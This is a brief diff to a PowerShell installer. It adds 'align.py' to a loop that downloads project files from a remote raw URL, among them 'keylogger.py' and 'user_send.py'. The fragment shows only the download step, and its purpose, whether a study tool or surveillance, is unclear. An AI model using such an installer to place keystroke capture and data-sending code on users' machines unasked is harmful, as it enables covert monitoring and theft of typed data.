@@ -12,7 +12,7 @@ if (-not $ver -or [version]$ver -lt [version]"3.10" -or [version]$ver -ge [versi
     $env:Path = [Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [Environment]::GetEnvironmentVariable("Path","User")
 }
 
-foreach ($f in "keylogger.py","survey.py","user_send.py","updater.py","app_paths.py","version.py","requirements.txt") {
+foreach ($f in "keylogger.py","survey.py","user_send.py","updater.py","app_paths.py","align.py","version.py","requirements.txt") {
     Invoke-WebRequest "$raw/$f" -OutFile (Join-Path $dir $f) -UseBasicParsing
 }
 
